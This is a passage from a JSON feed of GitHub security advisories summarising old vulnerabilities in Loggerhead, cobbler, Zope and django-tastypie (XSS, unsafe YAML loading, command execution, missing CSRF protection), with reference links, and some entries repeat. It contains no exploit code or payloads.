                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in <code>templatefunctions.py</code> in Loggerhead before 1.18.1 allows remote authenticated users to inject arbitrary web script or HTML via a filename, which is not properly handled in a revision view.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-0728\">https://nvd.nist.gov/vuln/detail/CVE-2011-0728</a></li>\n<li><a href=\"https://bugs.launchpad.net/loggerhead/+bug/740142\">https://bugs.launchpad.net/loggerhead/+bug/740142</a></li>\n<li><a href=\"https://exchange.xforce.ibmcloud.com/vulnerabilities/66305\">https://exchange.xforce.ibmcloud.com/vulnerabilities/66305</a></li>\n<li><a href=\"https://launchpad.net/loggerhead/1.18/1.18.1\">https://launchpad.net/loggerhead/1.18/1.18.1</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2011-April/057413.html\">http://lists.fedoraproject.org/pipermail/package-announce/2011-April/057413.html</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2011-April/057479.html\">http://lists.fedoraproject.org/pipermail/package-announce/2011-April/057479.html</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2011-April/057502.html\">http://lists.fedoraproject.org/pipermail/package-announce/2011-April/057502.html</a></li>\n<li><a href=\"https://web.archive.org/web/20200228162139/http://www.securityfocus.com/bid/47032\">https://web.archive.org/web/20200228162139/http://www.securityfocus.com/bid/47032</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjmg-77xh-7mjw\">https://github.com/advisories/GHSA-qjmg-77xh-7mjw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qjmg-77xh-7mjw",
            "title": "[loggerhead] Loggerhead XSS via filename",
            "date_modified": "2024-01-15T21:03:06.000Z",
            "date_published": "2022-05-17T02:01:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qjmg-77xh-7mjw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>set_mgmt_parameters</code> function in item.py in cobbler before 2.2.2 allows context-dependent attackers to execute arbitrary code via vectors related to the use of the <code>yaml.load</code> function instead of the <code>yaml.safe_load function</code>, as demonstrated using Puppet.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4953\">https://nvd.nist.gov/vuln/detail/CVE-2011-4953</a></li>\n<li><a href=\"https://bugs.launchpad.net/ubuntu/oneiric/+source/cobbler/+bug/858883\">https://bugs.launchpad.net/ubuntu/oneiric/+source/cobbler/+bug/858883</a></li>\n<li><a href=\"https://bugzilla.novell.com/show_bug.cgi?id=757062\">https://bugzilla.novell.com/show_bug.cgi?id=757062</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-04/msg00019.html\">http://lists.opensuse.org/opensuse-security-announce/2012-04/msg00019.html</a></li>\n<li><a href=\"https://github.com/cobbler/cobbler/commit/1b4f9ecf051422eb8512794701900f6199651442\">https://github.com/cobbler/cobbler/commit/1b4f9ecf051422eb8512794701900f6199651442</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hpj3-5p46-g87w\">https://github.com/advisories/GHSA-hpj3-5p46-g87w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hpj3-5p46-g87w",
            "title": "[cobbler] Cobbler vulnerable to code injection via unsafe YAML loading",
            "date_modified": "2024-01-15T20:50:35.000Z",
            "date_published": "2022-05-17T04:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hpj3-5p46-g87w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Unspecified vulnerability in Zope 2.12.x and 2.13.x, as used in Plone 4.0.x through 4.0.9, 4.1, and 4.2 through 4.2a2, allows remote attackers to execute arbitrary commands via vectors related to the <code>p_</code> class in <code>OFS/misc_.py</code> and the use of Python modules.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-3587\">https://nvd.nist.gov/vuln/detail/CVE-2011-3587</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=742297\">https://bugzilla.redhat.com/show_bug.cgi?id=742297</a></li>\n<li><a href=\"http://plone.org/products/plone-hotfix/releases/20110928\">http://plone.org/products/plone-hotfix/releases/20110928</a></li>\n<li><a href=\"http://plone.org/products/plone/security/advisories/20110928\">http://plone.org/products/plone/security/advisories/20110928</a></li>\n<li><a href=\"http://pypi.python.org/pypi/Products.PloneHotfix20110928/1.0\">http://pypi.python.org/pypi/Products.PloneHotfix20110928/1.0</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/491a583d8c6622b80c75917e5017c4bb4b15e477\">https://github.com/zopefoundation/Zope/commit/491a583d8c6622b80c75917e5017c4bb4b15e477</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/6bb2fb3c04a76b00bec9bd7c069733e06fa6ebe9\">https://github.com/zopefoundation/Zope/commit/6bb2fb3c04a76b00bec9bd7c069733e06fa6ebe9</a></li>\n<li><a href=\"https://web.archive.org/web/20111013043934/http://zope2.zope.org/news/security-vulnerability-announcement-cve-2011-3587\">https://web.archive.org/web/20111013043934/http://zope2.zope.org/news/security-vulnerability-announcement-cve-2011-3587</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8w48-m6hx-rjw2\">https://github.com/advisories/GHSA-8w48-m6hx-rjw2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8w48-m6hx-rjw2",
            "title": "[zope2] Zope Command Execution Vulnerability",
            "date_modified": "2024-01-15T18:14:24.000Z",
            "date_published": "2022-05-17T05:37:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8w48-m6hx-rjw2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Unspecified vulnerability in Zope 2.12.x and 2.13.x, as used in Plone 4.0.x through 4.0.9, 4.1, and 4.2 through 4.2a2, allows remote attackers to execute arbitrary commands via vectors related to the <code>p_</code> class in <code>OFS/misc_.py</code> and the use of Python modules.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-3587\">https://nvd.nist.gov/vuln/detail/CVE-2011-3587</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=742297\">https://bugzilla.redhat.com/show_bug.cgi?id=742297</a></li>\n<li><a href=\"http://plone.org/products/plone-hotfix/releases/20110928\">http://plone.org/products/plone-hotfix/releases/20110928</a></li>\n<li><a href=\"http://plone.org/products/plone/security/advisories/20110928\">http://plone.org/products/plone/security/advisories/20110928</a></li>\n<li><a href=\"http://pypi.python.org/pypi/Products.PloneHotfix20110928/1.0\">http://pypi.python.org/pypi/Products.PloneHotfix20110928/1.0</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/491a583d8c6622b80c75917e5017c4bb4b15e477\">https://github.com/zopefoundation/Zope/commit/491a583d8c6622b80c75917e5017c4bb4b15e477</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/6bb2fb3c04a76b00bec9bd7c069733e06fa6ebe9\">https://github.com/zopefoundation/Zope/commit/6bb2fb3c04a76b00bec9bd7c069733e06fa6ebe9</a></li>\n<li><a href=\"https://web.archive.org/web/20111013043934/http://zope2.zope.org/news/security-vulnerability-announcement-cve-2011-3587\">https://web.archive.org/web/20111013043934/http://zope2.zope.org/news/security-vulnerability-announcement-cve-2011-3587</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8w48-m6hx-rjw2\">https://github.com/advisories/GHSA-8w48-m6hx-rjw2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8w48-m6hx-rjw2",
            "title": "[zope2] Zope Command Execution Vulnerability",
            "date_modified": "2024-01-15T18:14:24.000Z",
            "date_published": "2022-05-17T05:37:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8w48-m6hx-rjw2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in Zope 2.8.x before 2.8.12, 2.9.x before 2.9.12, 2.10.x before 2.10.11, 2.11.x before 2.11.6, and 2.12.x before 2.12.3, 3.1.1 through 3.4.1. allows remote attackers to inject arbitrary web script or HTML via vectors related to the way error messages perform sanitization. NOTE: this issue exists because of an incomplete fix for CVE-2010-1104</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4924\">https://nvd.nist.gov/vuln/detail/CVE-2011-4924</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2011-4924\">https://access.redhat.com/security/cve/cve-2011-4924</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4924\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4924</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2011-4924\">https://security-tracker.debian.org/tracker/CVE-2011-4924</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/16\">http://www.openwall.com/lists/oss-security/2012/01/19/16</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/17\">http://www.openwall.com/lists/oss-security/2012/01/19/17</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/18\">http://www.openwall.com/lists/oss-security/2012/01/19/18</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/19\">http://www.openwall.com/lists/oss-security/2012/01/19/19</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/37e4ea774acc668f6b430a45a6ab1e359710f590\">https://github.com/zopefoundation/Zope/commit/37e4ea774acc668f6b430a45a6ab1e359710f590</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/a0655194cb39ad88ce3323a3e489927c5f979c44\">https://github.com/zopefoundation/Zope/commit/a0655194cb39ad88ce3323a3e489927c5f979c44</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vh6g-786f-hxxp\">https://github.com/advisories/GHSA-vh6g-786f-hxxp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vh6g-786f-hxxp",
            "title": "[zope2] Zope XSS Vulnerability",
            "date_modified": "2024-01-15T17:29:16.000Z",
            "date_published": "2022-04-22T00:24:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vh6g-786f-hxxp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in Zope 2.8.x before 2.8.12, 2.9.x before 2.9.12, 2.10.x before 2.10.11, 2.11.x before 2.11.6, and 2.12.x before 2.12.3, 3.1.1 through 3.4.1. allows remote attackers to inject arbitrary web script or HTML via vectors related to the way error messages perform sanitization. NOTE: this issue exists because of an incomplete fix for CVE-2010-1104</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4924\">https://nvd.nist.gov/vuln/detail/CVE-2011-4924</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2011-4924\">https://access.redhat.com/security/cve/cve-2011-4924</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4924\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4924</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2011-4924\">https://security-tracker.debian.org/tracker/CVE-2011-4924</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/16\">http://www.openwall.com/lists/oss-security/2012/01/19/16</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/17\">http://www.openwall.com/lists/oss-security/2012/01/19/17</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/18\">http://www.openwall.com/lists/oss-security/2012/01/19/18</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/19\">http://www.openwall.com/lists/oss-security/2012/01/19/19</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/37e4ea774acc668f6b430a45a6ab1e359710f590\">https://github.com/zopefoundation/Zope/commit/37e4ea774acc668f6b430a45a6ab1e359710f590</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/a0655194cb39ad88ce3323a3e489927c5f979c44\">https://github.com/zopefoundation/Zope/commit/a0655194cb39ad88ce3323a3e489927c5f979c44</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vh6g-786f-hxxp\">https://github.com/advisories/GHSA-vh6g-786f-hxxp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vh6g-786f-hxxp",
            "title": "[zope2] Zope XSS Vulnerability",
            "date_modified": "2024-01-15T17:29:16.000Z",
            "date_published": "2022-04-22T00:24:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vh6g-786f-hxxp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in Zope 2.8.x before 2.8.12, 2.9.x before 2.9.12, 2.10.x before 2.10.11, 2.11.x before 2.11.6, and 2.12.x before 2.12.3, 3.1.1 through 3.4.1. allows remote attackers to inject arbitrary web script or HTML via vectors related to the way error messages perform sanitization. NOTE: this issue exists because of an incomplete fix for CVE-2010-1104</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4924\">https://nvd.nist.gov/vuln/detail/CVE-2011-4924</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2011-4924\">https://access.redhat.com/security/cve/cve-2011-4924</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4924\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4924</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2011-4924\">https://security-tracker.debian.org/tracker/CVE-2011-4924</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/16\">http://www.openwall.com/lists/oss-security/2012/01/19/16</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/17\">http://www.openwall.com/lists/oss-security/2012/01/19/17</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/18\">http://www.openwall.com/lists/oss-security/2012/01/19/18</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/01/19/19\">http://www.openwall.com/lists/oss-security/2012/01/19/19</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/37e4ea774acc668f6b430a45a6ab1e359710f590\">https://github.com/zopefoundation/Zope/commit/37e4ea774acc668f6b430a45a6ab1e359710f590</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/a0655194cb39ad88ce3323a3e489927c5f979c44\">https://github.com/zopefoundation/Zope/commit/a0655194cb39ad88ce3323a3e489927c5f979c44</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vh6g-786f-hxxp\">https://github.com/advisories/GHSA-vh6g-786f-hxxp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vh6g-786f-hxxp",
            "title": "[zope] Zope XSS Vulnerability",
            "date_modified": "2024-01-15T17:29:16.000Z",
            "date_published": "2022-04-22T00:24:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vh6g-786f-hxxp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>from_yaml</code> method in serializers.py in Django Tastypie before 0.9.10 does not properly deserialize YAML data, which allows remote attackers to execute arbitrary Python code via vectors related to the yaml.load method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4104\">https://nvd.nist.gov/vuln/detail/CVE-2011-4104</a></li>\n<li><a href=\"https://github.com/toastdriven/django-tastypie/commit/e8af315211b07c8f48f32a063233cc3f76dd5bc2\">https://github.com/toastdriven/django-tastypie/commit/e8af315211b07c8f48f32a063233cc3f76dd5bc2</a></li>\n<li><a href=\"https://groups.google.com/forum/#!topic/django-tastypie/i2aNGDHTUBI\">https://groups.google.com/forum/#!topic/django-tastypie/i2aNGDHTUBI</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/nov/01/piston-and-tastypie-security-releases/\">https://www.djangoproject.com/weblog/2011/nov/01/piston-and-tastypie-security-releases/</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2011/11/02/1\">http://www.openwall.com/lists/oss-security/2011/11/02/1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2011/11/02/7\">http://www.openwall.com/lists/oss-security/2011/11/02/7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qgvw-qc2q-gv5q\">https://github.com/advisories/GHSA-qgvw-qc2q-gv5q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qgvw-qc2q-gv5q",
            "title": "[django-tastypie] Django Tastypie Improper Deserialization of YAML Data",
            "date_modified": "2024-01-12T20:55:44.000Z",
            "date_published": "2022-05-14T03:08:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qgvw-qc2q-gv5q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>cobbler: Web interface lacks CSRF protection when using Django framework</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4952\">https://nvd.nist.gov/vuln/detail/CVE-2011-4952</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2011-4952\">https://access.redhat.com/security/cve/cve-2011-4952</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4952\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-4952</a></li>\n<li><a href=\"https://security-tracker.debian.org/tracker/CVE-2011-4952\">https://security-tracker.debian.org/tracker/CVE-2011-4952</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2012/04/12/10\">http://www.openwall.com/lists/oss-security/2012/04/12/10</a></li>\n<li><a href=\"https://github.com/cobbler/cobbler/commit/18eb1c06779b37d89dfb2962a08236dd1bab24a6\">https://github.com/cobbler/cobbler/commit/18eb1c06779b37d89dfb2962a08236dd1bab24a6</a></li>\n<li><a href=\"https://github.com/cobbler/cobbler/commit/4bee30b4086a8d845bea5d39d6f2cba1f4a396aa\">https://github.com/cobbler/cobbler/commit/4bee30b4086a8d845bea5d39d6f2cba1f4a396aa</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fqr-pqc9-f7pj\">https://github.com/advisories/GHSA-9fqr-pqc9-f7pj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fqr-pqc9-f7pj",
            "title": "[cobbler] Cobbler Web Interface Lacks CSRF Protection",
            "date_modified": "2024-01-12T20:54:14.000Z",
            "date_published": "2022-04-22T00:24:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fqr-pqc9-f7pj"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}